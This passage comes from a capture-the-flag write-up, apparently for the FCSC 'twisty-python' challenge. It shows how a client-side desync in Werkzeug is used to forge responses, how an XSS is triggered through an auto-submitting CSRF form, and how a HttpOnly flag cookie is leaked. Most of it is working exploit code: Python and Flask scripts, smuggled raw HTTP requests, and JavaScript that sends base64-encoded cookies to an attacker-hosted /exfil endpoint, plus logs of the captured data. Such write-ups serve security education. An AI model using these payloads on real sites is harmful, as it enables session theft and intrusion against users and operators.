+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span>  requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api?action=add&#39;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: payload,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;score&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;set-cookie&#39;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;session=&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;;&#39;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hello there
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api?action=color&amp;color=%ef%bf%bf HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 500</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /api?action=view&amp;raw=1 HTTP/0.9</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: vozec</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: session=</span><span style="color:#e6db74">{</span>get_session(response)<span style="color:#e6db74">}</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode()
+</span></span></code></pre></div><p><em>Server response</em> : <code>Hello there</code></p>
+<h2 id="response-creation--xss">Response creation &amp; XSS</h2>
+<p>Now that we&rsquo;re able to completely control the content of the response thanks to desynchronization, we can forge the following HTTP response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">Werkzeug/3.0.1 Python/3.11.8</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mon, 08 Apr 2024 10:43:55 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">title</span>&gt;XSS twisty&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>To make this XSS exploitable, we&rsquo;ll use a <em>CSRF</em> to get to the vulnerable site from our site, while sending the previous payload.</p>
+<p>I chose to use Flask to send the payload</p>
+<p>As described <a href="https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf" target="_blank">here</a> <em>(Abusing Client-Side Desync on Werkzeug to perform XSS on default configurations, Kévin GERVOT)</em>, I use encoding: <code>text/plain</code> to avoid url-encoding my payload.<br>
+My payload is placed in a <code>textarea</code> tag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, Response, request
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_session</span>(payload):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># url = &#39;https://twisty-python.france-cybersecurity-challenge.fr&#39;</span>
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8000&#39;</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span>  requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api?action=add&#39;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: payload,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;score&#34;</span>: <span style="color:#e6db74">&#34;a&#34;</span>
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;set-cookie&#39;</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;session=&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;;&#39;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Server: Werkzeug/3.0.1 Python/3.11.8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Date: Mon, 08 Apr 2024 10:43:55 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 266
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;title&gt;XSS twisty&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            alert(1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> get_session(response)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>smuggled <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /api?action=view&amp;raw=1 HTTP/0.9</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: vozec</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: session=</span><span style="color:#e6db74">{</span>session<span style="color:#e6db74">}</span><span style="color:#e6db74">;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;link rel=&#34;shortcut icon&#34; href=&#34;data:image/x-icon;,&#34; type=&#34;image/x-icon&#34;&gt; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;form action=&#34;http://127.0.0.1:8000/api?action=color&amp;color=%ef%bf%bf&#34; method=&#34;POST&#34; enctype=&#39;text/plain&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;textarea name=&#34;</span><span style="color:#e6db74">{</span>smuggled<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;&lt;/textarea&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/form&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        document.forms[0].submit();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> Response(payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">3333</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><p>When we go to my public ip on port 3000, we are instantly redirected and the XSS is triggered!</p>
+<p><img src="https://i.imgur.com/5SHYBIu.png" alt="Alert(1)"></p>
+<p>All that remains is to make a slight modification to the script to retrieve the first flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_session</span>(payload):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://twisty-python.france-cybersecurity-challenge.fr&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Server: FakeResponse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;title&gt;XSS twisty&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            document.location=&#39;http://&lt;ip&gt;:3333/exfil?data=&#39;.concat(btoa(document.cookie))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/exfil&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exfiltrate</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;data&#39;</span>)
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> b64decode(data<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>data<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;#&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>, file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;OK&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>We use the <em>submit_url.py</em> file to send the bot to our site:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 submit_url.py --challenge <span style="color:#e6db74">&#34;https://twisty-python.france-cybersecurity-challenge.fr&#34;</span> --url <span style="color:#e6db74">&#34;http://&lt;ip&gt;:3333&#34;</span>
+</span></span></code></pre></div><p>Then, after a few seconds, we find the flag in the server logs:</p>
+<pre tabindex="0"><code>$ python3 poc.py
+ * Serving Flask app &#39;poc&#39; (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:3333
+ * Running on http://&lt;ip&gt;:3333
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 516-152-805
+172.18.224.1 - - [08/Apr/2024 19:58:08] &#34;GET / HTTP/1.1&#34; 200 -
+####################################################################################################
+flag_medium=FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}
+####################################################################################################
+172.18.224.1 - - [08/Apr/2024 19:58:08] &#34;GET /exfil?data=ZmxhZ19tZWRpdW09RkNTQ3tlYzBmNGYyY2Q0MTdmMDc4OGVmZDkwOTc2N2IwYzI2OTBmMTFiZWRiNDE4YjJkNzc3M2U2YzlhNjUzN2M3YTI2fQ== HTTP/1.1&#34; 200 -
+</code></pre><p>Flag: <code>FCSC{ec0f4f2cd417f0788efd909767b0c2690f11bedb418b2d7773e6c9a6537c7a26}</code></p>
+<h2 id="second-exploitation">Second exploitation.</h2>
+<p>The next mission gets tougher: we&rsquo;ll have to use the XSS to find a way of leaking the <code>flag_hard</code> cookie, which is <em>HttpOnly</em> and therefore not accessible via <code>document.cookie</code>.</p>
+<p>Before proceeding with the rest of the exploit. Instead of including javascript code directly in the page, I&rsquo;ll host it on my <strong>/js</strong> endpoint and a script tag will execute it when the forged HTTP response is received.</p>
+<p>This is a practical modification which will save us from encoding problems.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Server: FakeResponse
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;title&gt;XSS twisty&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;script src=&#39;http://&lt;ip&gt;:3333/js&#39;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &lt;/body&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/js&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">js</span>():
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">document.location=&#39;http://&lt;ip&gt;:3333/exfil?data=&#39;.concat(btoa(document.cookie))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> payload
+</span></span></code></pre></div><h3 id="tracks-and-reflection">Tracks and reflection.</h3>
+<p>Not knowing exactly all the techniques for stealing an HTTP-Only cookie, I decided to search the internet and here are the different methods that I found for all types of services:</p>
+<ul>
+<li>Using the <code>TRACE</code> method</li>
+<li>Using <code>phpinfo</code> in <em>php</em></li>
+<li>Using a page that reflects cookies in the DOM.</li>
+<li>Cookie Smuggling Due to Parsing Issues (see <a href="https://youtu.be/F_wAzF4a7Xg" target="_blank">here</a> and <a href="https://blog.ankursundara.com/cookie-bugs/" target="_blank">here</a>)</li>
+</ul>
+<p>None of these techniques seem feasible: it is a python application which only accepts <em>POST</em> and <em>GET</em> methods and which never reflects cookies.</p>
+<p>On the other hand, a video catch my attention, that of <a href="">James Kettle</a>, CyberSecurity researcher at Portswigger.
+It&rsquo;s called <code>HTTP Desync Attacks: Smashing into the Cell Next Doo</code> <em>(link <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI" target="_blank">here</a>)</em> and presents the possibilities of exploitation with a desync attack.
+(An <a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank">article</a> also exists on the <em>portswigger</em> blog.)</p>
+<p>Finally, <a href="https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync#abusing-http-response-queue-desynchronisation" target="_blank">this page</a> from hacktricks gave me the solution:</p>
+<p>Here is the overall progress of the exploitation:</p>
+<ul>
+<li>Via XSS, we send a desynchronization with inside a second request with a large <code>Content-length</code> on the <code>add</code> action.</li>
+<li>The <em>Content-length</em> being greater than the size of the body sent, the server will wait for data before terminating the connection.</li>
+<li>By sending the bot to make another request on the site, the data in the TCP frame will be considered as the body of the previous request and not as a new request.</li>
+<li>The content of the page can be found with the <code>view</code> action.</li>
+</ul>
+<h4 id="theoretical-exploitation">Theoretical exploitation:</h4>
+<p>A prerequisite for the attack to work is that the requests are all in the same TCP connection.<br>
+TCP sessions are identifiable via a ConnectionId <em>(visible in the Google Chrome console)</em>. For two requests to keep the same TCP session, the <code>Keep-Alive</code> header must be present in order to specify to the two entities not to cut the connection.</p>
+<h3 id="technical-exploitation">Technical exploitation:</h3>
+<p>We can update our javascript code like this:</p>
+<ul>
+<li>We clean the scoreboard with the <code>clear</code> action</li>
+<li>We send a smuggling with the <code>add</code> action and a <code>Content-Length</code> of &hellip; 800.</li>
+<li>We send a request with <code>cors</code> mode and <code>credentials</code> in <strong>include</strong></li>
+<li>We retrieve the page which is saved in the scoreboard</li>
+<li>We exfiltrate the flag.</li>
+</ul>
+<p>In order to keep the same TCP connection, I use the javascript <code>fetch</code> function and chain it with <code>.then(response =&gt; { })</code></p>
+<p>Here is the form of the full exploit from xss:</p>
+<pre tabindex="0"><code>fetch(&#39;/api?action=clear&#39;)
+    .then(
+        fetch(&#39;/api?action=color&amp;color=%ef%bf%bf&#39;)
+            .then(
+                fetch(&#39;/&#39;).then(
+                    fetch(&#39;/api?action=view&amp;raw=1&#39;)
+                        .then(
+                            document.location=&#39;...&#39;
+                        )
+                )
+            )
+    )
+</code></pre><h3 id="problems-encountered--resolutions">Problems encountered &amp; resolutions:</h3>
+<h4 id="connectionid-different-and-request-which-remains-in-status-pending">ConnectionId different and request which remains in status <em>pending</em>:</h4>
+<p>In order to maintain a connection between several requests, the <code>keep-alive</code> header must be used.
+However, since <a href="https://github.com/pallets/werkzeug/pull/2091" target="_blank">this pull requests</a>, Werkzeug no longer takes into account the <em>keep-alive</em> header in HTTP/1.1. Indeed, the server systematically returns a session closure header: <code>Connection: close</code>.</p>
+<p>Here is the responsible snippet of code: <a href="https://github.com/pallets/werkzeug/blob/d3dd65a27388fbd39d146caacf2563639ba622f0/src/werkzeug/serving.py#L287-L291" target="_blank">here</a></p>
+<p>A second problem is that the request that is smuggled is waiting for data, so it never ends and remains in status <em>pending</em>.
+The TCP socket is therefore never &ldquo;released&rdquo;, the following request is never sent.</p>
+<p>The resolution to these two problems is common, we must arrive at:</p>
+<ul>
+<li>Return something to the browser so that it sends the next request.</li>
+<li>Make sure that the return does not contain <code>Connection: close</code></li>
+</ul>
+<p>After diving early into the Werkzeug source code, we end up coming across [these two lines of code](<a href="https://github.com/pallets/werkzeug/blob/d6c2fe14682c95ba08921d3474f4f6527d471fe2/src/werkzeug/serving.py#L242-" target="_blank">https://github.com/pallets/werkzeug/blob/d6c2fe14682c95ba08921d3474f4f6527d471fe2/src/werkzeug/serving.py#L242-</a> L243):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;Expect&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>lower()<span style="color:#f92672">.</span>strip() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;100-continue&#34;</span>:
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;HTTP/1.1 100 Continue</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>If the <code>Expect</code> header has the value <code>100-continue</code>, then the server immediately returns <code>HTTP/1.1 100 Continue</code>, it&rsquo;s perfect!</p>
+<h4 id="bad-character-">Bad character: <em>&amp;</em></h4>
+<p>When saving the page, the entire query is saved, including the headers.
+Some of them contain the <em>&amp;</em> character which breaks the query on <code>/api?action=add</code>. Indeed, the body being in <em>application/www-form-urlencoded</em>, the &amp; serves as a separator for the variables and <code>name</code> is cut off.</p>
+<p>This character being in the header referer, I added this line to my exploit to remove it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">pushState</span>(<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>,<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span></code></pre></div><h4 id="bad-alignment-in-the-tcp-queue">Bad alignment in the TCP queue.</h4>
+<p>The last bug I had was that I wasn&rsquo;t receiving any pages on <code>/api?action=view</code><br>
+For some rather obscure reason, it is necessary to add 25 characters to the callback of the request which smuggle <em>(?action=color)</em> . This is notably because the server is waiting for data between the first POST and the smuggled request.<br>
+So I tested and observed that locally, I was able to retrieve my page with <em>25</em> characters, this corresponds to the size of the response sent: <code>&quot;HTTP/1.1 100 Continue\r\n\r\ n&quot;</code></p>
+<h4 id="bad-content-lenght">Bad Content-Lenght.</h4>
+<p>You also need to find the correct <strong>Content-Length</strong> to put in the smuggled query on <code>?action=add</code>. You must enter the number of bytes that you wish to recover from the rest of the buffer.<br>
+Locally, I will get the flag with a value of <em>699</em> but this was a little different remotely: <em>(665)</em></p>
+<h3 id="final-achievement">Final achievement:</h3>
+<p>Here is my final version of the exploitation</p>
